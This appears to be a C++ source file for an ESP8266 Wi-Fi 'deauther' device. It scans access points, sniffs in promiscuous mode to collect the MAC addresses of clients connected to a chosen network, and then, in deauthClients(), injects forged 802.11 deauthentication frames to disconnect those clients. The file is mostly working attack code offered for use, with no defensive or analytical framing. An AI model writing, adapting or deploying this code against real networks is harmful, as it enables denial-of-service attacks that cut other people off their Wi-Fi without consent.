#include "WiFiScanner.h"
#include "ESP8266WiFi.h"
#include "ESPPL.h"

uint8_t numAPs;
uint8_t numClients;
String apList[50][5];     // MAC, SSID, Channel, RSSI, Encryption
String clientList[50][3]; // MAC, AP, RSSI  |  if broadcast address (FFFFFFFFFFFF), its an unconnected device

String accessPoints[50]; // only accesspoints
String clients[50];

uint8_t ft; uint8_t fst; // frame type and subtype
uint8_t ch; int8_t rssi;

String srcMac; char srcOctet[2];
String dstMac; char dstOctet[2];

String packet[7];
String ssid;

String tmpBSSID;

uint8_t clientsToDeauth[300];
uint8_t numToDeauth = 0;

WiFiScanner::WiFiScanner() {  

}

// void cb(esppl_frame_info *info) {
//   ft = 0; fst = 0;
//   srcMac = ""; dstMac = ""; ssid = "";
//   ch = 0; rssi = 0;
// //  if (!(((int) info->frametype== 0 && (int) info->framesubtype ==8) || ((int) info->frametype== 1 && (int) info->framesubtype ==9) || ((int) info->frametype== 0 && (int) info->framesubtype ==4))) {
// //  Serial.print("\n");     
// //  Serial.print("FT: ");  
//  Serial.print((int) info->frametype); 
//   ft = (int) info->frametype;

  
// //  Serial.print(" FST: ");  
//  Serial.println((int) info->framesubtype); 
//   fst = (int) info->framesubtype;
  
//  Serial.print(" SRC: ");
//   for (int i = 0; i < 6; i++) {sprintf(srcOctet, "%02x", info->sourceaddr[i]); srcMac+=srcOctet; if (i!=5) srcMac+=":";}
//  Serial.println(srcMac);
  
//  Serial.print(" DEST: ");
//   for (int i = 0; i < 6; i++) {sprintf(dstOctet, "%02x", info->receiveraddr[i]); dstMac+=dstOctet;  if (i!=5) dstMac+=":";}

//   srcMac.toUpperCase();
//   dstMac.toUpperCase();
//  Serial.println(dstMac);
  
// //  Serial.print(" RSSI: ");
// //  Serial.print(info->rssi); 
//   rssi = info->rssi;
  
// //  Serial.print(" SEQ: ");
// //  Serial.print(info->seq_num);
  
// //  Serial.print(" CHNL: ");
// //  Serial.print(info->channel); 
//   ch = (int) info->channel;
  
// //  if (info->ssid_length > 0) {
// //    Serial.print(" SSID: ");
// //    for (int i = 0; i < info->ssid_length; i++) Serial.print((char) info->ssid[i]);    

// if (info->ssid_length > 0) {for (int i= 0; i< info->ssid_length; i++) { ssid+= (char) info->ssid[i]; }}

  
//  Serial.println();
// //  }



//     packet[0] = (String) info->frametype;
//     packet[1] = (String) info->framesubtype;
//     packet[2] = srcMac;
//     packet[3] = dstMac;
//     packet[4] = (String) info->rssi;
//     packet[5] = (String) info->channel;
//     packet[6] = ssid;
//     ft = packet[0].toInt(); fst = packet[1].toInt();     
// }

bool clientNotLogged(String clientToLog) {
  for (int i=0; i<numClients; i++) {
    if (clientToLog.equals(clients[i])) return false;
  }
  return true;  
}

// append to list of devices 
void cb(esppl_frame_info *info) {
  srcMac = ""; dstMac = "";

  // Serial.print("\n");
  // Serial.print("FT: ");  
  // Serial.print((int) info->frametype);
  // Serial.print(" FST: ");  
  // Serial.print((int) info->framesubtype);
  // Serial.print(" SRC: ");
  for (int i = 0; i < 6; i++) {sprintf(srcOctet, "%02x", info->sourceaddr[i]); srcMac+=srcOctet; if (i!=5) srcMac+=":";}
  // Serial.print(" DEST: ");
  for (int i = 0; i < 6; i++) {sprintf(dstOctet, "%02x", info->receiveraddr[i]); dstMac+=dstOctet;  if (i!=5) dstMac+=":";}
  // Serial.print(" RSSI: ");
  // Serial.print(info->rssi);
  // Serial.print(" SEQ: ");
  // Serial.print(info->seq_num);
  // Serial.print(" CHNL: ");
  // Serial.print(info->channel);
  // if (info->ssid_length > 0) {
  //   Serial.print(" SSID: ");
  //   for (int i = 0; i < info->ssid_length; i++) Serial.print((char) info->ssid[i]);    
  // }

  if ((tmpBSSID.equals(srcMac) and !dstMac.equals("ff:ff:ff:ff:ff:ff")) or (tmpBSSID.equals(dstMac) and !srcMac.equals("ff:ff:ff:ff:ff:ff"))){
    Serial.print(srcMac); Serial.print("--->"); Serial.println(dstMac);
    if (tmpBSSID.equals(srcMac) and clientNotLogged(dstMac)){
      clients[numClients] = dstMac;
      numClients++;
    }
    else if (tmpBSSID.equals(dstMac) and clientNotLogged(srcMac)) {
      clients[numClients] = srcMac;
      numClients++;
    }
    
  }
}

void WiFiScanner::init() {
  esppl_init(cb);
}

void WiFiScanner::scanAPs() {
  Serial.println("Starting Access Point scan...");
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  numAPs = WiFi.scanNetworks(false,true);  // async, hidden networks
  WiFi.mode(WIFI_OFF);
  
  Serial.print((String)(numAPs) + " AP\'s found! \n");
    
   for (int i = 0; i < numAPs; i++) {
    WiFi.getNetworkInfo(i, ssid, encryptionType, RSSI, BSSID, channel, isHidden);
    Serial.print(i+1); Serial.print(": ");
    Serial.print(WiFi.BSSIDstr(i)); Serial.print("   "); Serial.print(RSSI); Serial.print("   "); Serial.println(channel);
    apList[i][0] = WiFi.BSSIDstr(i);
    apList[i][1] = isHidden ? "* Hidden Network *" : ssid;
    apList[i][2] = channel;
    apList[i][3] = RSSI;
    apList[i][4] = encryptionType; // encryptionType == ENC_TYPE_NONE ? "open" :: "";
  }
}


// contingent on access point scan - lock in channel
// append clients to list only with bssid corresponding to ap

void WiFiScanner::scanClients(unsigned long scanTime) {
  unsigned long prevTime;
  unsigned long currTime;

  prevTime = millis();
  currTime = millis();

  numClients = 0;
  Serial.print(prevTime); Serial.print("  ");
  Serial.println(currTime);

esppl_sniffing_start();
    tmpBSSID = WiFi.BSSIDstr(scrollIndex);
    tmpBSSID.toLowerCase(); // tmpBSSID.replace(":","");
    // for (int i = 1; i < 15; i++ ) {
      Serial.print("Looking for data from ");
      Serial.print(tmpBSSID);
      Serial.println();
      

  while ((currTime-prevTime)/1000 < scanTime) {
    currTime = millis(); 

    
      esppl_set_channel(WiFi.channel(scrollIndex));
      while (esppl_process_frames()) {
        //
      }

      ::display.clear();
      uint8_t progress = (((currTime-prevTime)/1000));
      ::display.drawString(3,20,"Scanning for Clients");
      ::display.drawProgressBar(2, 40, 124, 6, map(progress, 0,scanTime,0,100));
      ::display.display();
    // }
  } 
  // clients[numClients] = "...";
  // clients[numClients+1] = "* START ATTACK *";
  wifi_promiscuous_enable(false); 
}

void WiFiScanner::getAPs() { // return list of just APs
 
 // empty accesspoints
 for (int i=0; i<numAPs; i++) {
  //  Serial.println(apList[i][1]);
   accessPoints[i]= apList[i][1];
 }
//  return accessPoints;

}

void WiFiScanner::setDeauthList() {

  // reset deauth list here optional
 
  numToDeauth = 0;
 Serial.print("Num to deauth: "); Serial.println(numToDeauth);
  
  for (int i=0; i<numClients; i++) { // total client count
      uint8_t deauthCount =0;
    if(clients[i].indexOf("*") >= 0){


      
      String deauthCl = clients[i];      
      deauthCl.replace("* ","");
      deauthCl.replace(":","");

      for(int j=0; j<12; j+=2){

        String tmpDeauthCl = deauthCl.substring(j,j+2);
        
        // Serial.print(tmpDeauthCl); Serial.print("  ");
        uint8_t num = std::strtoul(&tmpDeauthCl[0], NULL, 16);

        clientsToDeauth[(numToDeauth*6)+deauthCount]= num;

        
        deauthCount++;
        // clientsToDeauth[(i+1)*j]= num2;
      }
      Serial.println();


      // Serial.println();
      numToDeauth++;
    }
    
  }

}

void WiFiScanner::deauthClients() {

  wifi_set_channel(WiFi.channel(scrollIndex));

  uint8_t tmpAP[6];

  String tmpAPbssid = WiFi.BSSIDstr(scrollIndex);
  tmpAPbssid.replace(":","");

  uint8_t maccnt = 0;
  uint8_t idk; uint8_t idk2;

  for (int i=0; i<12; i+=2) {
    String meow = tmpAPbssid.substring(i,i+2);

    idk = std::strtoul(&meow[0], NULL, 16);
    tmpAP[maccnt] = (idk);

    maccnt++;
  }
  // Serial.println();
  


  Serial.println("Deauthing "+numToDeauth);

  for (int j=0; j< numToDeauth; j++) {

    packetSize = sizeof(deauthPacket);
    uint8_t deauthpkt[packetSize];
    memcpy(deauthpkt, deauthPacket, packetSize);

    memcpy(&deauthpkt[4],  &clientsToDeauth[(j*6)], 6);
    memcpy(&deauthpkt[10], tmpAP, 6); // ap
    memcpy(&deauthpkt[16], tmpAP, 6); // ap
    deauthpkt[24] = 1;
    
    wifi_set_channel(1);
    bool sent = wifi_send_pkt_freedom(deauthpkt, packetSize, 0) == 0;

    // Serial.println(&clientsToDeauth[j*6]);
    Serial.print(j); Serial.print(": ");
    Serial.println(sent);
    delay(50);

  }
  // Serial.println(&clientsToDeauth[0]);



}
